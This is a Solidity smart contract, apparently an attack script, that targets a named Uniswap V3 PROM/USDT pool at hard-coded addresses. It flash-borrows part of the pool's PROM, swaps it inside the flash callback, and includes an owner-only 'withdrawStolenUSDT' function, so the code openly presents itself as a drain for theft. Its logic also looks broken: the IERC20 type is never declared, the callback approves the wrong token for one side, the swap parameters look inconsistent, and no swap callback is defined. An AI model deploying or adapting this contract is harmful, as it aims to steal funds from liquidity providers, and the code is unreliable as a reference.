pragma solidity 0.7.6;
pragma abicoder v2;
interface IUniswapV3Pool {
    function flash(
        address recipient,
        uint256 amount0,
        uint256 amount1,
        bytes calldata data
    ) external;
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}
contract PromV3FlashDrain {
    address private constant PROM_USDT_POOL = 0x3902428a74A08a91e2Cb2Fd834De75E69974FE67;
    address private constant PROM_TOKEN = 0xfc82bb4ba86045Af6F327323a46E80412b91b27d;
    address private constant USDT_TOKEN = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    IUniswapV3Pool private pool = IUniswapV3Pool(PROM_USDT_POOL);
    IERC20 private promToken = IERC20(PROM_TOKEN);
    IERC20 private usdtToken = IERC20(USDT_TOKEN);
    address public owner;
    uint256 private borrowedAmount0;
    uint256 private borrowedAmount1;
    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }
    constructor() {
        owner = msg.sender;
    }
    function executeDrain() external onlyOwner {
        address poolToken0 = pool.token0();
        address poolToken1 = pool.token1();
        uint256 totalBalance = 0;
        if (poolToken0 == PROM_TOKEN) {
            uint256 poolBalance = promToken.balanceOf(PROM_USDT_POOL);
            totalBalance = (poolBalance * 1) / 100;
            borrowedAmount0 = totalBalance;
            borrowedAmount1 = 0;
        } else if (poolToken1 == PROM_TOKEN) {
            uint256 poolBalance = promToken.balanceOf(PROM_USDT_POOL);
            totalBalance = (poolBalance * 1) / 100;
            borrowedAmount1 = totalBalance;
            borrowedAmount0 = 0;
        } else {
            revert("PROM is not in this pool");
        }
        require(totalBalance > 0, "Nothing to borrow");
        pool.flash(address(this), borrowedAmount0, borrowedAmount1, "");
    }
    function uniswapV3FlashCallback(
        uint256 fee0,
        uint256 fee1,
        bytes calldata
    ) external {
        require(msg.sender == PROM_USDT_POOL, "Callback must come from pool");
        uint256 amountToRepay0 = borrowedAmount0 + fee0;
        uint256 amountToRepay1 = borrowedAmount1 + fee1;
        if (amountToRepay0 > 0) {
            promToken.approve(PROM_USDT_POOL, amountToRepay0);
        }
        if (amountToRepay1 > 0) {
            promToken.approve(PROM_USDT_POOL, amountToRepay1);
        }
        uint256 amountPromToSwap = borrowedAmount0 > 0 ? borrowedAmount0 : borrowedAmount1;
        if (amountPromToSwap > 0) {
            pool.swap(
                address(this),
                false,
                -int256(amountPromToSwap),
                type(uint160).max,
                new bytes(0)
            );
        }
    }
    function withdrawStolenUSDT() external onlyOwner {
        uint256 balance = usdtToken.balanceOf(address(this));
        require(balance > 0, "No USDT to withdraw");
        usdtToken.transfer(owner, balance);
    }
    receive() external payable {}
}